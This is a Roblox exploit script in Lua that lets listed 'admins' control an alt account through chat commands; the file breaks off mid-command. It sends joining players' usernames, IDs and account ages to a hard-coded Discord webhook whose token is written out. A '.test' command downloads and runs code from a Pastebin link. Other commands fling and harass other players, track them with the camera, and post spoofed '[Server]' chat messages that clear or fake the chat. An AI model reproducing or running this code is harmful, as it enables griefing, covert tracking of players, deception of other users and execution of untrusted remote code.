--new control
getgenv().owner = "VisitHeavenWithMe"

local preDefinedAdmins = {game.Players.LocalPlayer.UserId, 3453099747, 734299537, 3393832878, 204883218, 2625498861, 3949012086, 4974242943, 1495203457, 28162621, 3337438370, 6006089221, 2456779797, 188229924, 8026559823, 3629310376, 1725699, 564135136}
local admins = {}
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local teleportPosition = Vector3.new(-897.6600952148438, -3545.0717163085938, -709.875732421875)
local tweenOrigin = "hell" --"heaven" or "hell"
local LocalPlayer = Players.LocalPlayer
local antiStompEnabled = false
local antiStompConnection

------------------------------------------------------------WEBHOOK
local function sendWebhook(player, adminName)
    local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    local OSTime = os.time()
    local Time = os.date('!*t', OSTime)

    local Content = '@everyone ' .. player.Name .. " joined"
    local Embed = {
        title = '*',
        color = tonumber(0x99999),
        footer = { text = game.Players.LocalPlayer.Name },
        fields = {
            { name = "Display:", value = player.DisplayName, inline = true},
            { name = "Username:", value = player.Name, inline = true},
            { name = "", value = "", inline = true},
            { name = "Game:", value = GetName.Name, inline = true},
            { name = "GameID:", value = game.PlaceId, inline = true},
            { name = "", value = "", inline = true},
            { name = "Age:", value = player.AccountAge, inline = true},
            { name = "UserID:", value = player.UserId, inline = true},
            { name = "", value = "", inline = true},
            { name = "Joined via:", value = adminName or "Unknown", inline = false }
        },
        timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
    }

    pcall(function()
        (syn and syn.request or http_request) {
            Url = 'https://discord.com/api/webhooks/1432329249880281131/gbpc1t8TbFaTGWOHFZIzrLKc2ilHjO7ROh1Zd3D8KlYerW402TZ7_NaP4iDytQoc0pKs',
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = game:GetService('HttpService'):JSONEncode({
                username = "Bitch Snitch", 
                avatar_url = "",  
                content = Content,
                embeds = { Embed }
            })
        }
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player.FollowUserId ~= 0 and player.UserId ~= LocalPlayer.UserId and table.find(preDefinedAdmins, player.FollowUserId) and not table.find(preDefinedAdmins, player.UserId) then
        pcall(function()
            local adminName = Players:GetNameFromUserIdAsync(player.FollowUserId)
            sendWebhook(player, adminName)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player.FollowUserId ~= 0 and player.UserId ~= LocalPlayer.UserId and table.find(preDefinedAdmins, player.FollowUserId) and not table.find(preDefinedAdmins, player.UserId) then
        pcall(function()
            local adminName = Players:GetNameFromUserIdAsync(player.FollowUserId)
            sendWebhook(player, adminName)
        end)
    end
end)

---------------------------------------------------------------

local function isNewChatSystem()
    local TextChatService = game:GetService("TextChatService")
    
    local success1 = pcall(function()
        return TextChatService.ChatVersion == Enum.ChatVersion.TextChatService
    end)
    if success1 then
        return true
    end
    
    local hasMessageReceived = pcall(function()
        local test = TextChatService.MessageReceived
        return test ~= nil
    end)
    if hasMessageReceived then
        return true
    end
    
    local hasTextChannels = TextChatService:FindFirstChild("TextChannels") ~= nil
    if hasTextChannels then
        return true
    end
    
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local oldChatExists = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") ~= nil
    
    if not oldChatExists then
        return true
    end
    
    return false
end

local function AddAdmin(Player)
    if not admins[Player.UserId] then
        admins[Player.UserId] = Player
    end
end

for _, userId in ipairs(preDefinedAdmins) do
    local Player = Players:GetPlayerByUserId(userId)
    if Player then AddAdmin(Player) end
end

Players.PlayerAdded:Connect(function(Player)
    if table.find(preDefinedAdmins, Player.UserId) then
        AddAdmin(Player)
    end
end)

local viewing = nil
local lastViewed = nil
local viewDied, viewChanged, monitorViewConnection
local function StartViewing(TargetPlr)
    if viewDied then
        viewDied:Disconnect()
        viewChanged:Disconnect()
    end

    viewing = TargetPlr
    lastViewed = TargetPlr
    local CurrentCamera = game.Workspace.CurrentCamera
    CurrentCamera.CameraSubject = TargetPlr.Character

    local function viewDiedFunc()
        repeat wait() until TargetPlr.Character and TargetPlr.Character:FindFirstChild("HumanoidRootPart")
        CurrentCamera.CameraSubject = TargetPlr.Character.HumanoidRootPart
    end

    viewDied = TargetPlr.CharacterAdded:Connect(viewDiedFunc)

    local function viewChangedFunc()
        CurrentCamera.CameraSubject = TargetPlr.Character.HumanoidRootPart
    end

    viewChanged = CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)

    if monitorViewConnection then
        monitorViewConnection:Disconnect()
    end

    monitorViewConnection = game.Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer == TargetPlr then
            viewing = nil
            CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.HumanoidRootPart
        end
    end)

    game.Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer.Name == lastViewed.Name then
            lastViewed = newPlayer
            viewing = newPlayer
            CurrentCamera.CameraSubject = newPlayer.Character.HumanoidRootPart

            if viewDied then
                viewDied:Disconnect()
            end
            viewDied = newPlayer.CharacterAdded:Connect(viewDiedFunc)
        end
    end)
end

local flingingTargets = {}
local currentFlingingIndex = 1
local flingingCycleConnection = nil
local flingingHeartbeatConnection = nil

local function isValidTarget(target)
    return target and target.Parent and target.Character and 
           target.Character:FindFirstChild("HumanoidRootPart") and
           target.Character:FindFirstChild("Humanoid") and
           target.Character.Humanoid.Health > 0
end

local function getTargetTorso(target)
    if not target or not target.Character then return nil end
    return target.Character:FindFirstChild("Torso") or target.Character:FindFirstChild("UpperTorso")
end

local function cleanupInvalidTargets()
    for i = #flingingTargets, 1, -1 do
        local target = flingingTargets[i]
        if not target or not target.Parent then
            table.remove(flingingTargets, i)
        end
    end
    
    if currentFlingingIndex > #flingingTargets then
        currentFlingingIndex = 1
    end
end

function fling(target, multiplier, velocity)
    if not target then return end

    local found = false
    for _, t in pairs(flingingTargets) do
        if t == target then
            found = true
            break
        end
    end
    
    if not found then
        table.insert(flingingTargets, target)
    end

    if not flingingCycleConnection then
        startFlingingCycle(multiplier, velocity)
    end
end

function startFlingingCycle(multiplier, velocity)
    if flingingCycleConnection then
        pcall(function() task.cancel(flingingCycleConnection) end)
        flingingCycleConnection = nil
    end
    if flingingHeartbeatConnection then
        pcall(function() flingingHeartbeatConnection:Disconnect() end)
        flingingHeartbeatConnection = nil
    end

    local function cycleTargets()
        while #flingingTargets > 0 do
            cleanupInvalidTargets()
            
            if #flingingTargets == 0 then
                break
            end

            local currentTarget = flingingTargets[currentFlingingIndex]

            if not currentTarget or not currentTarget.Parent then
                currentFlingingIndex = currentFlingingIndex + 1
                if currentFlingingIndex > #flingingTargets then currentFlingingIndex = 1 end
                task.wait(1)
            elseif not isValidTarget(currentTarget) then
                while currentTarget.Parent and not isValidTarget(currentTarget) do
                    task.wait(1)
                end
                if not currentTarget.Parent then
                    currentFlingingIndex = currentFlingingIndex + 1
                    if currentFlingingIndex > #flingingTargets then currentFlingingIndex = 1 end
                    task.wait(1)
                end
            else
                local startTime = tick()
                local flingDuration = 0.5
                
                flingingHeartbeatConnection = RunService.Heartbeat:Connect(function()
                    if tick() - startTime >= flingDuration then
                        if flingingHeartbeatConnection then
                            flingingHeartbeatConnection:Disconnect()
                            flingingHeartbeatConnection = nil
                        end
                        return
                    end

                    local localCharacter = LocalPlayer.Character
                    local localHumanoidRootPart = localCharacter and localCharacter:FindFirstChild("HumanoidRootPart")
                    local localHumanoid = localCharacter and localCharacter:FindFirstChildOfClass("Humanoid")

                    if not localHumanoidRootPart or not localHumanoid then return end
                    if not isValidTarget(currentTarget) then return end

                    local targetPart = getTargetTorso(currentTarget)
                    if not targetPart then return end

                    if localHumanoid.Sit then
                        localHumanoid.Sit = false
                    end

                    local targetVelocity = targetPart.Velocity
                    local horizontalVelocity = Vector3.new(targetVelocity.X, 0, targetVelocity.Z)
                    
                    local targetPosition
                    if horizontalVelocity.Magnitude > 0.1 then
                        local predictionDistance = horizontalVelocity.Magnitude * (multiplier or 0.64)
                        targetPosition = targetPart.Position + horizontalVelocity.Unit * predictionDistance
                    else
                        targetPosition = targetPart.Position
                    end

                    localHumanoidRootPart.CFrame = CFrame.new(targetPosition)
                    localHumanoidRootPart.Velocity = velocity or Vector3.new(1000000, 1000000, 1000000)
                end)
                
                task.wait(flingDuration)
                
                if flingingHeartbeatConnection then
                    flingingHeartbeatConnection:Disconnect()
                    flingingHeartbeatConnection = nil
                end
            end

            currentFlingingIndex = currentFlingingIndex + 1
            
            if currentFlingingIndex > #flingingTargets then
                currentFlingingIndex = 1
                
                local localCharacter = LocalPlayer.Character
                if localCharacter then
                    local localHumanoidRootPart = localCharacter:FindFirstChild("HumanoidRootPart")
                    if localHumanoidRootPart then
                        local randomX = math.random(-10000, 10000)
                        local randomY = math.random(-10000, 10000)
                        local randomZ = math.random(-10000, 10000)
                        localHumanoidRootPart.CFrame = CFrame.new(randomX, randomY, randomZ)
                    end
                end
                
                task.wait(1)
            end
            
            task.wait(1)
        end
        
        stopAllFlinging()
    end

    flingingCycleConnection = task.spawn(cycleTargets)
end

function unfling(specificTarget)
    if specificTarget then
        for i = #flingingTargets, 1, -1 do
            if flingingTargets[i] == specificTarget then
                table.remove(flingingTargets, i)
                break
            end
        end
        
        if currentFlingingIndex > #flingingTargets then
            currentFlingingIndex = 1
        end
        
        if #flingingTargets == 0 then
            stopAllFlinging()
        end
    else
        stopAllFlinging()
    end
end

function stopAllFlinging()
    flingingTargets = {}
    currentFlingingIndex = 1
    
    if flingingCycleConnection then
        pcall(function()
            task.cancel(flingingCycleConnection)
        end)
        flingingCycleConnection = nil
    end
    
    if flingingHeartbeatConnection then
        pcall(function()
            flingingHeartbeatConnection:Disconnect()
        end)
        flingingHeartbeatConnection = nil
    end

    local localCharacter = LocalPlayer.Character
    local localHumanoidRootPart = localCharacter and localCharacter:FindFirstChild("HumanoidRootPart")
    local localHumanoid = localCharacter and localCharacter:FindFirstChildOfClass("Humanoid")

    if localHumanoidRootPart and localHumanoid then
        localHumanoid:ChangeState(Enum.HumanoidStateType.Physics)
        
        task.spawn(function()
            for i = 1, 10 do
                if localHumanoidRootPart.Parent then
                    localHumanoidRootPart.Velocity = localHumanoidRootPart.Velocity * 0.5
                    task.wait(0.05)
                end
            end

            if localHumanoidRootPart.Parent then
                localHumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                task.wait(0.3)

                local safetyPlatformPosition = Vector3.new(-897.6600952148438, -3530.0717163085938, -709.875732421875)
                localHumanoidRootPart.CFrame = CFrame.new(safetyPlatformPosition)
                
                localHumanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
        end)
    end
end

local function stopVanishIfActive()
    if randomVanishEnabled then
        randomVanishEnabled = false
        if randomVanishConnection then
            randomVanishConnection:Disconnect()
            randomVanishConnection = nil
        end
        
        local altCharacter = LocalPlayer.Character
        if altCharacter then
            local altRootPart = altCharacter:FindFirstChild("HumanoidRootPart")
            if altRootPart then
                altRootPart.CFrame = CFrame.new(teleportPosition)
            end
        end
    end
end

local function showFollowerGui(targetUserId)
    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local screenGui = playerGui:FindFirstChild("FollowerGui")

    if not screenGui then
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "FollowerGui"
        screenGui.Parent = playerGui

        local scrollingFrame = Instance.new("ScrollingFrame")
        scrollingFrame.Size = UDim2.new(0, 300, 0, 400)
        scrollingFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
        scrollingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        scrollingFrame.BackgroundTransparency = 0.5
        scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
        scrollingFrame.ScrollBarThickness = 8
        scrollingFrame.Name = "FollowerFrame"
        scrollingFrame.Parent = screenGui

        local layout = Instance.new("UIListLayout")
        layout.Padding = UDim.new(0, 10)
        layout.Parent = scrollingFrame

        local closeButton = Instance.new("TextButton")
        closeButton.Size = UDim2.new(0, 30, 0, 30)
        closeButton.Position = UDim2.new(1, -35, 0, 5)
        closeButton.Text = "X"
        closeButton.TextScaled = true
        closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeButton.Parent = scrollingFrame

        closeButton.MouseButton1Click:Connect(function()
            screenGui:Destroy()
        end)

        delay(20, function()
            if screenGui then
                screenGui:Destroy()
            end
        end)
    end

    local scrollingFrame = screenGui:FindFirstChild("FollowerFrame")

    local followerFrame = Instance.new("Frame")
    followerFrame.Size = UDim2.new(1, 0, 0, 100)
    followerFrame.BackgroundTransparency = 1
    followerFrame.Parent = scrollingFrame

    local headshotImage = Instance.new("ImageLabel")
    headshotImage.Size = UDim2.new(0, 70, 0, 70)
    headshotImage.Position = UDim2.new(0, 10, 0, 15)
    headshotImage.Image = game.Players:GetUserThumbnailAsync(targetUserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    headshotImage.Parent = followerFrame

    local targetPlayer = game.Players:GetPlayerByUserId(targetUserId)
    if targetPlayer then
        local displayName = targetPlayer.DisplayName
        local username = targetPlayer.Name

        local nameLabel = Instance.new("TextLabel")
        nameLabel.Size = UDim2.new(0, 200, 0, 70)
        nameLabel.Position = UDim2.new(0, 90, 0, 15)
        nameLabel.Text = "@" .. displayName .. "(@" .. username .. ")"
        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        nameLabel.TextScaled = true
        nameLabel.BackgroundTransparency = 1
        nameLabel.Parent = followerFrame
    end

    scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, scrollingFrame.UIListLayout.AbsoluteContentSize.Y + 40)
end

function settransparency(value)
    local playersFolder = game.Workspace:FindFirstChild("Players")
    local function isInPlayersFolder(part)
        local parent = part
        while parent do
            if parent == playersFolder then
                return true
            end
            parent = parent.Parent
        end
        return false
    end

    for _, part in pairs(game.Workspace:GetDescendants()) do
        if part:IsA("BasePart") and not isInPlayersFolder(part) then
            part.Transparency = value
        end
    end
end

local function chatMessage(str)
    str = tostring(str)
    local TextChatService = game:GetService("TextChatService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    local newChatSuccess = pcall(function()
        if TextChatService:FindFirstChild("TextChannels") then
            local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
            if generalChannel and generalChannel.SendAsync then
                generalChannel:SendAsync(str)
                return true
            end
        end
        
        if TextChatService.SendMessage then
            TextChatService:SendMessage(str)
            return true
        end
        
        return false
    end)
    
    if not newChatSuccess then
        local oldChatSuccess = pcall(function()
            local DefaultChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if DefaultChatEvents then
                local SayMessageRequest = DefaultChatEvents:FindFirstChild("SayMessageRequest")
                if SayMessageRequest then
                    SayMessageRequest:FireServer(str, 'All')
                    return true
                end
            end
            return false
        end)
        
        if not oldChatSuccess then
            warn("Failed to send chat message via both new and old systems")
        end
    end
end
local blob2 = "\u{001E}"
local blob = "\u{000D}"

local function forceTPose(character)
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
            track:Stop()
        end
        if humanoid.RigType == Enum.HumanoidRigType.R15 then
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, false)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, false)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying, false)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, false)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, true)
        end
    end
end

local function tweenToSpeaker(altRootPart, speakerRootPart)
    local startPosition
    if tweenOrigin == "heaven" then
        startPosition = speakerRootPart.Position + Vector3.new(0, 25, 0)
    elseif tweenOrigin == "hell" then
        startPosition = speakerRootPart.Position - Vector3.new(0, 15, 0)
    end

    local currentCFrame = altRootPart.CFrame
    local rotatedCFrame = currentCFrame * CFrame.Angles(0, math.rad(180), 0)
    altRootPart.CFrame = rotatedCFrame

    altRootPart.CFrame = CFrame.new(startPosition)

    local targetOffset = speakerRootPart.CFrame:PointToWorldSpace(Vector3.new(2, 2.5, 2))
    local targetPosition = targetOffset

    local distance = (startPosition - targetPosition).Magnitude
    local tweenTime = distance / 10

    if distance < 5 then
        tweenTime = distance / 1
    end

    local tweenInfo = TweenInfo.new(
        tweenTime,
        Enum.EasingStyle.Linear,
        Enum.EasingDirection.Out
    )
    local tween = TweenService:Create(altRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()

    tween.Completed:Wait()
end

local followConnection = nil

local function followMain(speaker)
    if not speaker or not speaker.Character then
        local altCharacter = LocalPlayer.Character
        if altCharacter then
            local altRootPart = altCharacter:FindFirstChild("HumanoidRootPart")
            if altRootPart then
                altRootPart.CFrame = CFrame.new(teleportPosition)
            end
        end
        return
    end

    local altCharacter = LocalPlayer.Character
    if not altCharacter then return end

    local altRootPart = altCharacter:FindFirstChild("HumanoidRootPart")
    local speakerRootPart = speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
    if not altRootPart or not speakerRootPart then return end

    forceTPose(altCharacter)

    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyVelocity.Parent = altRootPart

    tweenToSpeaker(altRootPart, speakerRootPart)
    forceTPose(altCharacter)
    if followConnection then
        followConnection:Disconnect()
    end

    followConnection = RunService.Heartbeat:Connect(function()
        if not speaker or not speaker.Character or not speaker.Character:FindFirstChild("HumanoidRootPart") then
            altRootPart.CFrame = CFrame.new(teleportPosition)
            followConnection:Disconnect()
            return
        end

        local speakerRootPart = speaker.Character:FindFirstChild("HumanoidRootPart")
        if altRootPart and altRootPart.Parent and speakerRootPart and speakerRootPart.Parent then
            local offset = speakerRootPart.CFrame:PointToWorldSpace(Vector3.new(2, 2.5, 2))

            local speakerVelocity = speakerRootPart.Velocity
            local isMoving = speakerVelocity.Magnitude > 1
            local predictedPosition = offset + (isMoving and speakerVelocity * 0.1 or Vector3.zero)

            local speakerRotation = speakerRootPart.CFrame - speakerRootPart.Position
            local altRotation = speakerRotation * CFrame.Angles(0, 0, math.rad(180))

            altRootPart.CFrame = CFrame.new(predictedPosition) * altRotation
        else
            followConnection:Disconnect()
        end
    end)

    speaker.CharacterAdded:Connect(function()
        wait(1)
        followMain(speaker)
    end)
end

local isCleanseRunning = false
local cleanseConnection = nil
local randomVanishEnabled = false
local randomVanishConnection = nil

local function vanish()
    local altCharacter = LocalPlayer.Character
    if not altCharacter then return end

    local altRootPart = altCharacter:FindFirstChild("HumanoidRootPart")
    if not altRootPart then return end

    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end
    
    if isCleanseRunning then
        isCleanseRunning = false
        if cleanseConnection then
            cleanseConnection:Disconnect()
            cleanseConnection = nil
        end
    end
    
    randomVanishEnabled = true
    
    if randomVanishConnection then
        randomVanishConnection:Disconnect()
    end
    randomVanishConnection = RunService.Heartbeat:Connect(function()
        if not randomVanishEnabled then return end
        altCharacter:FindFirstChildOfClass("Humanoid").PlatformStand = true
        local randomX = math.random(-10000, 10000)
        local randomY = math.random(-10000, 10000)
        local randomZ = math.random(-10000, 10000)
        
        altRootPart.CFrame = CFrame.new(randomX, randomY, randomZ)
    end)
end

local function AntiStompLoop()
    while antiStompEnabled do
        local player = game.Players.LocalPlayer
        local char = player.Character or player.CharacterAdded:Wait()
        local humanoid = char:FindFirstChild("Humanoid") or char:WaitForChild("Humanoid")
        local knockedState = char:FindFirstChild("BodyEffects") and char.BodyEffects:FindFirstChild("K.O")

        if humanoid and (humanoid.Health < 10 or (knockedState and knockedState.Value)) then
            humanoid.Health = 0
        end

        task.wait(0.1)
    end
end

local function toggleAntiStomp(state)
    if state then
        if not antiStompEnabled then
            antiStompEnabled = true
            antiStompConnection = task.spawn(AntiStompLoop)
        end
    else
        if antiStompEnabled then
            antiStompEnabled = false
            if antiStompConnection then
                task.cancel(antiStompConnection)
            end
        end
    end
end

local function findItemWithHandle()
    local player = Players.LocalPlayer
    local character = player.Character
    local backpack = player:FindFirstChildOfClass("Backpack")

    if character then
        for _, item in ipairs(character:GetChildren()) do
            if item:IsA("Tool") and item:FindFirstChild("Handle") then
                return item
            end
        end
    end

    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") and item:FindFirstChild("Handle") then
                return item
            end
        end
    end

    return nil
end

local function startCleanse()
    if isCleanseRunning then return end
    isCleanseRunning = true

    stopAllFlinging()
    toggleAntiStomp(false)
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end
    if randomVanishConnection then
        randomVanishConnection:Disconnect()
        randomVanishConnection = nil
        randomVanishEnabled = false
    end
    if _G.tpFrontConnection then
        _G.tpFrontConnection:Disconnect()
        _G.tpFrontConnection = nil
    end

    cleanseConnection = RunService.Heartbeat:Connect(function()
        if not isCleanseRunning then return end

        local character = LocalPlayer.Character
        if not character then return end

        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local rootPart = character:FindFirstChild("HumanoidRootPart")

        if rootPart then
            rootPart.CFrame = CFrame.new(teleportPosition)
        end

        local itemToEquip = findItemWithHandle()
        if itemToEquip and humanoid and humanoid.Health > 0 then
            humanoid:EquipTool(itemToEquip)
        end
    end)
end

local function stopCleanse()
    if not isCleanseRunning then
        return
    end
    
    isCleanseRunning = false
    
    if cleanseConnection then
        cleanseConnection:Disconnect()
        cleanseConnection = nil
    end

    local character = LocalPlayer.Character
    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.CFrame = CFrame.new(-897.660, -3540.072, -709.876)
        end
    end
end

---------------------------------------CHAT HANDLER-----------------------------------------------
local function processCommand(speakerName, message)
    local Speaker = Players:FindFirstChild(speakerName)
    if not Speaker or (Speaker.Name ~= getgenv().owner and not admins[Speaker.UserId]) then return end
    local args = string.split(message, " ")
    local command = args[1]:lower()
    local function GetPlayerFromString(partialName)
        if partialName:lower() == "me" then
          return game.Players:FindFirstChild(Speaker.Name)
        end
      
        if partialName:lower() == "random" then
          local players = game.Players:GetPlayers()
          if #players > 0 then
            return players[math.random(1, #players)]
          end
        end
      
        local bestMatch = nil
        local bestMatchScore = 0
      
        for _, plr in pairs(game.Players:GetPlayers()) do
          local nameMatch = plr.Name:lower():find(partialName:lower())
          local displayNameMatch = plr.DisplayName:lower():find(partialName:lower())
      
          if nameMatch or displayNameMatch then
            local score = (nameMatch and #plr.Name or 0) + (displayNameMatch and #plr.DisplayName or 0)
            if score > bestMatchScore then
              bestMatchScore = score
              bestMatch = plr
            end
          end
        end
      
        return bestMatch
      end

    if command == ".test" then
loadstring(game:HttpGet("https://pastebin.com/raw/5LUmhUw3", true))()
 elseif command == ".bring" then
        stopVanishIfActive()
        local speakerHead = Speaker.Character:FindFirstChild("Head")
        if speakerHead then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = speakerHead.CFrame * CFrame.new(3, 2, 0)
        end
    elseif command == ".rejoin" then
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    elseif command == ".log" then
        game:Shutdown()
    elseif command == ".re" then
            local hrp = LocalPlayer.Character.HumanoidRootPart
            local humanoid = LocalPlayer.Character.Humanoid
            hrp.Velocity = Vector3.new(2^7, 5^34, 4^7)
            task.wait(0.4)
            humanoid.Health = 0
            
    elseif command == ".view" then
        local TargetPlr = GetPlayerFromString(args[2])
        if TargetPlr then
            StartViewing(TargetPlr)
        end
    elseif command == ".unview" then
        viewing = nil
        lastViewed = nil
        if viewDied then
            viewDied:Disconnect()
            viewChanged:Disconnect()
        end
        game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character

 elseif command == ".fling" then
        stopVanishIfActive()
        local target = GetPlayerFromString(args[2])
        if target then
            fling(target, 0.59, Vector3.new(10000, 10000, 10000))
        end
        
    elseif command == "v" then
        if args[2] then
            local target = GetPlayerFromString(args[2])
            unfling(target)
        else
            unfling()
        end
    elseif command == ".friends" then
            local Player = GetPlayerFromString(args[2])
            if Player then
                local PlayerUserId = Player.UserId
                local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
                for _, plr in pairs(game.Players:GetChildren()) do
                    if plr.UserId ~= PlayerUserId then
                        if plr.FollowUserId == PlayerUserId then
                            showFollowerGui(plr.UserId)
                        end
                    end
                end
            else
                print("Player not found!")
            end
        elseif command == ".logjoins" then
            --nun
        elseif command == ".void" then    
            teleportPosition = Vector3.new(-897.6600952148438, -3545.0717163085938, -709.875732421875)
                    
        elseif command== ".sky" then
            teleportPosition = Vector3.new(0, 10000000009,0) 
    elseif command == "s" then
        stopVanishIfActive()
        SummonPlayer = Speaker
        if isCleanseRunning then
            stopCleanse()
        end
        followMain(SummonPlayer)

        elseif command == ".vanish" then
            vanish()

        elseif command == ".admin" then
            local Player = GetPlayerFromString(args[2])
            if Player then
                AddAdmin(Player)
                print(Player.Name .. " has been added as an admin.")
            else
                print("Player not found!")
            end
        elseif command == ".unadmin" then
            local Player = GetPlayerFromString(args[2])
            if Player and admins[Player.UserId] then
                admins[Player.UserId] = nil
                print(Player.Name .. " has been removed as an admin.")
            else
                print("Player not found or not an admin!")
            end
            elseif command == "!s" then
                local function handleSayCommand(message, Speaker)
                    local newStr = string.gsub(message, "!s", "")
                    local TextChatService = game:GetService("TextChatService")
                    local ReplicatedStorage = game:GetService("ReplicatedStorage")
                    
                    local success = pcall(function()
                        if TextChatService:FindFirstChild("TextChannels") then
                            local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
                            if generalChannel and generalChannel.SendAsync then
                                generalChannel:SendAsync(newStr)
                                return
                            end
                        end
                        
                        if TextChatService.SendMessage then
                            TextChatService:SendMessage(newStr)
                            return
                        end
                        
                        error("New chat methods failed")
                    end)
                    
                    if not success then
                        pcall(function()
                            local DefaultChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                            if DefaultChatEvents then
                                local SayMessageRequest = DefaultChatEvents:FindFirstChild("SayMessageRequest")
                                if SayMessageRequest then
                                    SayMessageRequest:FireServer(newStr, 'All')
                                end
                            end
                        end)
                    end
                end
        elseif command == ".joined" then
            local Player = GetPlayerFromString(args[2])
            if Player then
                if Player.FollowUserId ~= 0 then
                    local JoinedUsername = game.Players:GetNameFromUserIdAsync(Player.FollowUserId)
                    
                    local notification = Instance.new("ScreenGui")
                    notification.Name = "JoinNotification"
                    notification.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        
                    local textLabel = Instance.new("TextLabel")
                    textLabel.Size = UDim2.new(0, 400, 0, 50)
                    textLabel.Position = UDim2.new(0.5, -200, 0.1, 0)
                    textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
                    textLabel.TextColor3 = Color3.new(1, 1, 1)
                    textLabel.Text = Player.Name .. " joined through " .. JoinedUsername .. "'s profile."
                    textLabel.Parent = notification
    
                    
                    task.wait(1.5)
                    notification:Destroy()
                else
                    local notification = Instance.new("ScreenGui")
                    notification.Name = "JoinNotification"
                    notification.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        
                    local textLabel = Instance.new("TextLabel")
                    textLabel.Size = UDim2.new(0, 400, 0, 50)
                    textLabel.Position = UDim2.new(0.5, -200, 0.1, 0)
                    textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
                    textLabel.TextColor3 = Color3.new(1, 1, 1)
                    textLabel.Text = Player.Name .. " didn't join through anyone."
                    textLabel.Parent = notification
        
                    
                            
                    task.wait(1.5) 
                    notification:Destroy()
                end
            end
        elseif command == ".clean" then
            local Player = GetPlayerFromString(args[2])
                if Player then
                    local function deleteJackets(character)
                        for _, item in pairs(character:GetChildren()) do
                            if item:IsA("Accessory") and item.AccessoryType == Enum.AccessoryType.Jacket then
                                item:Destroy()
                            end
                        end
                    end
                
                    local character = game.Workspace:FindFirstChild(Player.Name) or game.Workspace.Players:FindFirstChild(Player.Name)
                    if character then
                        deleteJackets(character)
                    end
                
                    Player.CharacterAdded:Connect(function(character)
                        local workspaceCharacter = game.Workspace:FindFirstChild(Player.Name) or game.Workspace.Players:FindFirstChild(Player.Name)
                        deleteJackets(workspaceCharacter)
                    end)
                
                    
                end
        elseif command == ".noscreen" then
                game:GetService("RunService"):Set3dRenderingEnabled(false)
            
        elseif command == ".screen" then
                game:GetService("RunService"):Set3dRenderingEnabled(true)
            
        elseif command == ".setfps" then
            local fps = string.gsub(message, ".setfps ", "")
            setfpscap(fps)
        
        elseif command == ".antilag" then
            settransparency(1)

        elseif command == ".clearchat" then
            chatMessage(blob2 .. string.rep(blob, 140) .. "[Server]: ðŸ”¨ "..speakerName.." has cleared the chat.")
        elseif command == ".tc" then
            chatMessage(blob2 .. string.rep(blob, 120) .. "[Server]: ðŸ”¨ "..speakerName.." has joined the game.")
        elseif command == ".announce" then
            local announcement = table.concat(args, " ", 2)
            chatMessage(blob2 .. string.rep(blob, 20) .. "[Server]: " .. (announcement ~= "" and announcement or "Hello everyone!"))

        elseif command == ".heaven" then
            tweenOrigin = "heaven"
        elseif command == ".hell" then
            tweenOrigin = "hell"

        elseif command == ".antistomp" then
